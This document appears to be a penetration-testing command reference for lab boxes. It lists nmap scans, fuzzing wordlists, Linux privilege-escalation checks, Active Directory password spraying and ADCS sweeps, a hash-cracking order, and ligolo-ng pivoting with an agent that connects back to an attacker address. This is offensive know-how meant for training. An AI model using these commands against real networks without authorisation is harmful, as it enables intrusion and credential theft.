# Command Reference

Keyed to the phases. Adapt addresses, ports, and wordlists to the box in front of you; the shapes are the point.

## Phase 1: external enumeration

```sh
# Stage 1: full TCP discovery, fast, structured output
nmap -sS -Pn -n -p- --min-rate 5000 --open -oA scans/stage1-full <target>

# Stage 2: version and script scan on the open set only
nmap -sCV -Pn -n -p <open-ports> -oA scans/stage2-scv <target>

# UDP top-100 in parallel with Stage 2
nmap -sU -Pn -n --top-ports 100 -oA scans/udp-top100 <target>

# UDP escalation: top-1000 when the Phase 1 triggers fire
nmap -sU -Pn -n --top-ports 1000 -oA scans/udp-top1000 <target>
```

Rate note: 5000 is the default. 10000 is permitted on a re-scan if Stage 1 looks lossy (a known-open port missed).

## Wordlists, tiered

- Content, Tier 1: the dirb `common.txt` list, about 4,600 entries, about 5 seconds. Tier 2, in parallel or background: the SecLists `raft-medium` family, or a CMS-specific list if fingerprinted. Tier 3, background only: `directory-list-2.3-medium.txt`, about 220,000 entries. Specificity beats size.
- Speed, from published tool comparisons: ffuf is the fastest common choice, feroxbuster is recursive, gobuster is slower and predictable. At lab latency, list choice matters more than tool choice.
- Passwords: build a box-specific list first (CeWL on the app, plus usernames, the company, and box-name mutations) and run it before full rockyou online. Never feed rockyou (about 14.3 million entries) to a directory fuzzer.

## Phase 5: manual privesc quick-set

```sh
id; sudo -l
find / -perm -4000 -type f 2>/dev/null   # SUID, then check each against GTFOBins
getcap -r / 2>/dev/null                  # capabilities
crontab -l; ls -la /etc/cron* /var/spool/cron 2>/dev/null
history; env; ls -la ~
```

## Phase 6: AD essentials

```sh
# Username validation that does not spend the spray budget
kerbrute userenum --dc <dc-ip> -d <domain> users.txt

# Spray inside budget: one password, pairs in order, continue on success
nxc smb <targets> -u users.txt -p '<password>' --no-bruteforce --continue-on-success

# ADCS sweep, as soon as any domain credential exists
certipy find -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -vulnerable
```

## Hash cracking order

By expected value: (1) straight dictionary, curated or target list, then rockyou; (2) rules (best64 first, then dive or OneRule on what remains); (3) hybrid word plus mask (year and digit suffixes); (4) combinator for passphrases; (5) mask only with a known pattern or length policy. Slow hashes (bcrypt, Argon2): stop after step 2. Identify the mode first (`hashcat --identify` or hashid); the wrong mode is the top wasted GPU hour.

## Pivoting

```sh
# ligolo-ng: one TUN interface and one route per subnet
sudo ip tuntap add user "$USER" mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert                      # attacker side
# agent on the foothold: ./agent -connect <attacker-ip>:11601 -ignore-cert
# in the proxy session: session -> start -> route add
sudo ip route add <subnet>/24 dev ligolo

# Through-pivot scan form (full connects, not SYN)
nmap --unprivileged -sT -Pn -n <internal-target>

# SSH dynamic forwarding, the simple case
ssh -D 1080 user@<foothold>
```
